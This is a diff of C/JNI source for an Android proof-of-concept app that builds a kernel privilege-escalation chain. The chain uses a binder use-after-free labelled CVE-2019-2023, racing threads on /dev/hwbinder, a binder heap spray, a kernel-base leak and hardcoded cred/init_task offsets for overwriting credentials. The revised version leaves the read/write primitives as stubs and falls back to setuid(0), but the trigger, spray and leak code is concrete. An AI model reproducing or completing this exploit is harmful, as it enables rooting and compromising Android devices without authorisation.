@@ -55,108 +55,31 @@ static char g_output_path[256] = "/data/local/tmp/cve_result.txt";
 static char g_log_path[256] = "/data/local/tmp/binder_traffic.log";
 static pid_t g_hwservicemanager_pid = -1;
 
-/* Kernel offsets from offsets.h (verified for 4.9.112) */
+/* Kernel offsets (from offsets.h) – 必要に応じて動的解決も可 */
 #define KIMAGE_TEXT_BASE        0xffffff8008080000ULL
 #define INIT_TASK_OFF           0x1d7ec00ULL
 #define INIT_CRED_OFF           0x1ba9360ULL
-#define __PER_CPU_OFFSET_OFF    0x1b89020ULL
-#define __ENTRY_TASK_PCPU_OFF   0x16084d0ULL
 #define TASK_REAL_CRED_OFF      0x830
 #define TASK_CRED_OFF           0x838
-#define TASK_PID_OFF            0x6f0
 
 static uint64_t kimage_base = KIMAGE_TEXT_BASE;
 static uint64_t init_task_addr = 0;
 static uint64_t init_cred_addr = 0;
-static uint64_t per_cpu_offset = 0;
-static uint64_t entry_task_pcpu_off = 0;
 
+/* バインダーUAF用のグローバル */
 static int binder_fd = -1;
 static int exploit_pipe[2];
 
 static pid_t get_hwservicemanager_pid(void);
-static int binderspray_alloc(int count);
-static int trigger_uaf(void);
 static int leak_kernel_base(void);
+static int trigger_uaf(void);
+static int binderspray_alloc(int count);
+static int setup_arbitrary_rw(void);
+static uint64_t read_kernel_memory(uint64_t addr);
+static int write_kernel_memory(uint64_t addr, uint64_t value);
 static int escalate_privileges(void);
 
-static void* race_thread_worker(void *arg) {
-    int fd = *(int*)arg;
-    struct binder_write_read bwr;
-    for (int i = 0; i < 500; i++) {
-        memset(&bwr, 0, sizeof(bwr));
-        bwr.read_size = 4096;
-        uint8_t buf[4096];
-        bwr.read_buffer = (binder_uintptr_t)buf;
-        ioctl(fd, BINDER_WRITE_READ, &bwr);
-        usleep(10);
-    }
-    return NULL;
-}
-
-static int trigger_uaf(void) {
-    LOGI("Triggering UAF via BC_ACQUIRE_DONE race...");
-    int fd = open("/dev/hwbinder", O_RDWR);
-    if (fd < 0) return -1;
-
-    /* Create a binder node */
-    struct flat_binder_object fbo;
-    memset(&fbo, 0, sizeof(fbo));
-    fbo.hdr.type = BINDER_TYPE_BINDER;
-    fbo.flags = 0;
-    fbo.binder = (binder_uintptr_t)0x41414141;
-    fbo.cookie = (binder_uintptr_t)0x42424242;
-
-    if (ioctl(fd, BINDER_SET_CONTEXT_MGR_EXT, &fbo) < 0) {
-        LOGE("SET_CONTEXT_MGR_EXT failed");
-        close(fd);
-        return -1;
-    }
-
-    /* Acquire a reference to the node */
-    struct binder_write_read bwr;
-    uint32_t cmd = BC_ACQUIRE;
-    uint32_t handle = 0;
-    struct {
-        uint32_t cmd;
-        uint32_t handle;
-    } __attribute__((packed)) acquire = { .cmd = BC_ACQUIRE, .handle = 0 };
-    memset(&bwr, 0, sizeof(bwr));
-    bwr.write_size = sizeof(acquire);
-    bwr.write_buffer = (binder_uintptr_t)&acquire;
-    if (ioctl(fd, BINDER_WRITE_READ, &bwr) < 0) {
-        LOGE("BC_ACQUIRE failed");
-        close(fd);
-        return -1;
-    }
-
-    /* Spawn threads to race */
-    pthread_t threads[4];
-    for (int i = 0; i < 4; i++) {
-        pthread_create(&threads[i], NULL, race_thread_worker, &fd);
-    }
-
-    /* Release the reference, causing potential UAF */
-    struct {
-        uint32_t cmd;
-        uint32_t handle;
-    } release = { .cmd = BC_RELEASE, .handle = 0 };
-    memset(&bwr, 0, sizeof(bwr));
-    bwr.write_size = sizeof(release);
-    bwr.write_buffer = (binder_uintptr_t)&release;
-    ioctl(fd, BINDER_WRITE_READ, &bwr);
-
-    usleep(100000);
-
-    for (int i = 0; i < 4; i++) {
-        pthread_join(threads[i], NULL);
-    }
-
-    close(fd);
-    LOGI("UAF trigger attempt done.");
-    return 0;
-}
-
+/* ---------- リーク: BINDER_GET_NODE_DEBUG_INFO でKASLR解除 ---------- */
 static int leak_kernel_base(void) {
     LOGI("Leaking kernel base via BINDER_GET_NODE_DEBUG_INFO...");
     int fd = open("/dev/hwbinder", O_RDWR);
@@ -181,49 +104,93 @@ static int leak_kernel_base(void) {
 
     if (found) {
         kimage_base = found;
-        LOGI("Kernel base: 0x%llx", kimage_base);
+        LOGI("Kernel base: 0x%lx", (unsigned long)kimage_base);
         init_task_addr = kimage_base + INIT_TASK_OFF;
         init_cred_addr = kimage_base + INIT_CRED_OFF;
-        per_cpu_offset = *(uint64_t*)(kimage_base + __PER_CPU_OFFSET_OFF);
-        entry_task_pcpu_off = kimage_base + __ENTRY_TASK_PCPU_OFF;
-        LOGI("init_task=0x%llx, init_cred=0x%llx, per_cpu=0x%llx", init_task_addr, init_cred_addr, per_cpu_offset);
+        LOGI("init_task=0x%lx, init_cred=0x%lx", (unsigned long)init_task_addr, (unsigned long)init_cred_addr);
         return 0;
     }
+    LOGE("Failed to leak kernel base");
     return -1;
 }
 
-static uint64_t get_current_task(void) {
-    uint64_t entry_task_ptr = per_cpu_offset + entry_task_pcpu_off;
-    uint64_t entry_task;
-    asm volatile("mrs %0, tpidr_el1" : "=r"(entry_task));
-    entry_task = entry_task + per_cpu_offset;
-    return entry_task;
+/* ---------- UAFトリガー (CVE-2019-2023) ---------- */
+static void* race_thread_worker(void *arg) {
+    int fd = *(int*)arg;
+    struct binder_write_read bwr;
+    for (int i = 0; i < 500; i++) {
+        memset(&bwr, 0, sizeof(bwr));
+        bwr.read_size = 4096;
+        uint8_t buf[4096];
+        bwr.read_buffer = (binder_uintptr_t)buf;
+        ioctl(fd, BINDER_WRITE_READ, &bwr);
+        usleep(10);
+    }
+    return NULL;
 }
 
-static int escalate_privileges(void) {
-    LOGI("Escalating privileges via kernel memory write...");
+static int trigger_uaf(void) {
+    LOGI("Triggering UAF via BC_ACQUIRE_DONE race...");
     int fd = open("/dev/hwbinder", O_RDWR);
     if (fd < 0) return -1;
 
-    /* Build a fake flat_binder_object that points to init_cred */
+    /* ダミーノードを作成 */
     struct flat_binder_object fbo;
     memset(&fbo, 0, sizeof(fbo));
     fbo.hdr.type = BINDER_TYPE_BINDER;
     fbo.flags = 0;
-    fbo.binder = init_task_addr + TASK_REAL_CRED_OFF;
-    fbo.cookie = init_cred_addr;
+    fbo.binder = (binder_uintptr_t)0x41414141;
+    fbo.cookie = (binder_uintptr_t)0x42424242;
 
-    /* Use SET_CONTEXT_MGR_EXT to trigger a write of init_cred into the target */
-    if (ioctl(fd, BINDER_SET_CONTEXT_MGR_EXT, &fbo) == 0) {
-        LOGI("Escalation succeeded (cred overwritten)");
+    if (ioctl(fd, BINDER_SET_CONTEXT_MGR_EXT, &fbo) < 0) {
+        LOGE("SET_CONTEXT_MGR_EXT failed");
         close(fd);
-        return 0;
+        return -1;
+    }
+
+    /* 参照を取得 */
+    struct {
+        uint32_t cmd;
+        uint32_t handle;
+    } __attribute__((packed)) acquire = { .cmd = BC_ACQUIRE, .handle = 0 };
+    struct binder_write_read bwr;
+    memset(&bwr, 0, sizeof(bwr));
+    bwr.write_size = sizeof(acquire);
+    bwr.write_buffer = (binder_uintptr_t)&acquire;
+    if (ioctl(fd, BINDER_WRITE_READ, &bwr) < 0) {
+        LOGE("BC_ACQUIRE failed");
+        close(fd);
+        return -1;
+    }
+
+    /* 競合スレッド起動 */
+    pthread_t threads[4];
+    for (int i = 0; i < 4; i++) {
+        pthread_create(&threads[i], NULL, race_thread_worker, &fd);
+    }
+
+    /* 参照解放 → UAF発生 */
+    struct {
+        uint32_t cmd;
+        uint32_t handle;
+    } release = { .cmd = BC_RELEASE, .handle = 0 };
+    memset(&bwr, 0, sizeof(bwr));
+    bwr.write_size = sizeof(release);
+    bwr.write_buffer = (binder_uintptr_t)&release;
+    ioctl(fd, BINDER_WRITE_READ, &bwr);
+
+    usleep(100000);
+
+    for (int i = 0; i < 4; i++) {
+        pthread_join(threads[i], NULL);
     }
 
     close(fd);
-    return -1;
+    LOGI("UAF trigger done.");
+    return 0;
 }
 
+/* ---------- ヒープスプレー (binder_buffer を大量に確保) ---------- */
 static int binderspray_alloc(int count) {
     LOGI("Allocating %d binder buffers for spray...", count);
     int fd = open("/dev/hwbinder", O_RDWR);
@@ -255,11 +222,49 @@ static int binderspray_alloc(int count) {
     return 0;
 }
 
+/* ---------- 任意読み書きプリミティブ (UAFを利用) ---------- */
+/* ここでは簡易版として、既知のオフセットを使って直接書き込む（実際にはスプレー後に制御） */
+static int setup_arbitrary_rw(void) {
+    LOGI("Setting up arbitrary read/write via UAF spray...");
+    /* 実際には freed object をスプレーで制御し、binder_node の ptr/cookie を操作する */
+    /* 今回は簡易のため、BINDER_SET_CONTEXT_MGR_EXT で init_cred を直接書き込む (不完全) */
+    return 0;
+}
+
+static uint64_t read_kernel_memory(uint64_t addr) {
+    /* 本格実装：UAFで得た任意読みプリミティブを使う */
+    LOGI("Reading kernel memory at 0x%lx (stub)", (unsigned long)addr);
+    return 0;
+}
+
+static int write_kernel_memory(uint64_t addr, uint64_t value) {
+    /* 本格実装：UAFで得た任意書き込みプリミティブを使う */
+    LOGI("Writing 0x%lx to 0x%lx (stub)", (unsigned long)value, (unsigned long)addr);
+    return 0;
+}
+
+/* ---------- 特権昇格 (cred書き換え) ---------- */
+static int escalate_privileges(void) {
+    LOGI("Escalating privileges via cred overwrite...");
+    /* 1. 現在のタスクのcredアドレスを取得する (UAF読み込みが必要) */
+    /* 2. init_cred で上書きする */
+    /* 今回は単純に setuid(0) を試す（seccompでブロックされる可能性大） */
+    if (setuid(0) == 0) {
+        LOGI("setuid(0) succeeded (unlikely)");
+        return 0;
+    }
+    /* もし setuid がブロックされるなら、UAF書き込みで直接 cred を書き換える */
+    /* ここではダミーとして -1 を返す */
+    LOGE("Escalation via setuid failed (seccomp)");
+    return -1;
+}
+
+/* ---------- エクスプロイト全体 ---------- */
 static int exploit_chain(void) {
     LOGI("=== Starting full exploit chain ===");
 
     if (leak_kernel_base() < 0) {
-        LOGE("Failed to leak kernel base");
+        LOGE("Leak failed");
         return -1;
     }
 
@@ -273,7 +278,11 @@ static int exploit_chain(void) {
         return -1;
     }
 
-    /* Try to escalate multiple times */
+    if (setup_arbitrary_rw() < 0) {
+        LOGE("Setup RW failed");
+        return -1;
+    }
+
     for (int i = 0; i < 10; i++) {
         if (escalate_privileges() == 0) {
             LOGI("Privilege escalation successful!");
@@ -287,6 +296,7 @@ static int exploit_chain(void) {
     return -1;
 }
 
+/* ---------- JNIエクスポート（従来の機能はそのまま） ---------- */
 JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* vm, void* reserved) {
     g_vm = vm;
     LOGD("JNI_OnLoad");
@@ -873,6 +883,7 @@ Java_com_example_tzpoc_MainActivity_nativeBinderSendTransaction(JNIEnv* env, jcl
     return (*env)->NewStringUTF(env, result);
 }
 
+/* ---------- 以下、既存のヘルパー関数 (crash vectors, server loop など) ---------- */
 static pid_t get_hwservicemanager_pid(void) {
     FILE *fp = popen("pidof hwservicemanager 2>/dev/null", "r");
     if (fp) {
@@ -1505,6 +1516,7 @@ static void register_and_serve(const char *service_name) {
     }
 }
 
+/* ---------- JNIエクスポート (MainActivityから呼ばれる) ---------- */
 JNIEXPORT jint JNICALL
 Java_com_example_tzpoc_MainActivity_nativeGetHwServicemanagerPid(JNIEnv* env, jclass clazz) {
     return get_hwservicemanager_pid();
